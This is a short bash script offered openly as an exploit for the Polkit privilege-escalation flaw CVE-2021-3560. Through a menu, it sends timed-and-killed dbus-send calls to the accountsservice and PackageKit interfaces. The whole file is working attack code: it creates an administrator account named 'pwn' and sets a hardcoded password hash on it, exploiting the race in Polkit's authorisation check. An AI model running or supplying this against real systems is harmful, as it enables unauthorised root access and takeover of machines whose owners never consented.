#!/bin/bash

# bash script for exploiting Polkit: CVE-2021-3560

echo '[*] exploit for Polkit: CVE-2021-3560'

echo '[*] default user and pass is = pwn:pwn3d'

echo '0-installPkg'

echo '1-checkTiming'

echo '2-adduser'

echo '3-addpasswd'

read q

if [ "$q" == "0" ]; then
	echo $(dbus-send --system --dest=org.freedesktop.PackageKit --type=method_call --print-reply /org/freedesktop/PackageKit org.freedesktop.PackageKit.InstallPackageName string:gnome-control-center int32:1 & sleep 0.005s; kill $!)

fi

if [ "$q" == "1" ]; then
	echo $(time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:'Pentester Account' int32:1)

fi

if [ "$q" == "2" ]; then
	echo $(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwn string:'Pentester Account' int32:1 & sleep 0.005s; kill $!)
	echo '[*] user added successfully'
fi

if [ "$q" == "3" ]; then
	echo $(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$eldepGonumNIa2nw$RD04Qkl7qU7l9c8pRdQPi1KEyq6acXAw.1CxlcqZFaTjuaqjYbURqNhTtaLvOxduu6KFwNIqmXqfJOimgd0eq1' string:'Ask the pentester' & sleep 0.005s; kill $!)
	echo '[*] password added successfully'
fi
